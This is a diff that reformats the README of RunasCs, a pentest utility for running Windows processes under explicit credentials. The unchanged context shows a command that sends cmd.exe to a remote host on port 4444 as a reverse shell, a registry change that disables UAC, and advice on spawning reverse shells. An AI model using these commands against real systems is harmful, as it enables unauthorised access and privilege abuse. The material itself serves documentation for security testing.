@@ -2,23 +2,23 @@
 
 ----
 
-RunasCs is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials.
-This tool is an improved (from a pentest perspective) and open version of windows builtin runas.exe that solves some limitations:
+*RunasCs* is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials.
+This tool is an improved (from a pentest perspective) and open version of windows builtin *runas.exe* that solves some limitations:
 
 * Allows explicit credentials
 * Works both if spawned from interactive process and from service process
-* Manage properly DACL for Window Stations and Desktop for the creation of the new process
-* Uses more reliable create process functions like CreateProcessAsUser() and CreateProcessWithTokenW() if the calling process holds the required privileges (automatic detection)
-* Allows to specify the logon type, i.e. network logon 3 (no UAC limitations)
-* Allows redirecting stdin, stdout and stderr to a remote host
+* Manage properly *DACL* for *Window Stations* and *Desktop* for the creation of the new process
+* Uses more reliable create process functions like ``CreateProcessAsUser()`` and ``CreateProcessWithTokenW()`` if the calling process holds the required privileges (automatic detection)
+* Allows to specify the logon type, i.e. network logon 3 (no *UAC* limitations)
+* Allows redirecting *stdin*, *stdout* and *stderr* to a remote host
 * It's Open Source :)
 
-RunasCs has an automatic detection to determine the best create process function for every contexts.
+*RunasCs* has an automatic detection to determine the best create process function for every contexts.
 Based on the process caller token permissions, it will use one of the create process function in the following preferred order:
 
-* CreateProcessAsUser()
-* CreateProcessWithTokenW()
-* CreateProcessWithLogonW()
+1. ``CreateProcessAsUser()``
+2. ``CreateProcessWithTokenW()``
+3. ``CreateProcessWithLogonW()``
 
 
 ### Requirements
@@ -88,18 +88,18 @@ Examples:
         RunasCs.exe "user1" "password1" "cmd.exe" -r 10.10.10.24:4444
 ```
 
-The two processes (calling and called) will communicate through 1 pipe (both for stdout and stderr).
-The default logon type is 3 (Network_Logon). If you set Interactive (2) logon type you will face some UAC restriction problems.
+The two processes (calling and called) will communicate through one *pipe* (both for *stdout* and *stderr*).
+The default logon type is 3 (*Network_Logon*). If you set *Interactive* (2) logon type you will face some *UAC* restriction problems.
 You can make interactive logon without any restrictions by setting the following regkey to 0 and restart the server:
 
 ```
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA
 ```
 
-By default, the calling process (RunasCs) will wait until the end of the execution of the spawned process and will use
-cmd.exe to manage stdout and stderr. If you need to spawn a background or async process, i.e. spawning a reverse shell,
-you need to set the parameter 'timeout' to 0. In this case the process will be spawned without using cmd.exe and RunasCs
-won't wait for the end of the execution.
+By default, the calling process (*RunasCs*) will wait until the end of the execution of the spawned process and will use
+``cmd.exe`` to manage *stdout* and *stderr*. If you need to spawn a background or async process, i.e. spawning a reverse shell,
+you need to set the parameter ``-t timeout`` to ``0``. In this case the process will be spawned without using ``cmd.exe``
+and *RunasCs* won't wait for the end of the execution.
 
 ### References
 
@@ -117,5 +117,5 @@ won't wait for the end of the execution.
 
 -----
 
-[@decoder](https://github.com/decoder-it)
-[@qtc-de](https://github.com/qtc-de)
+* [@decoder](https://github.com/decoder-it)
+* [@qtc-de](https://github.com/qtc-de)
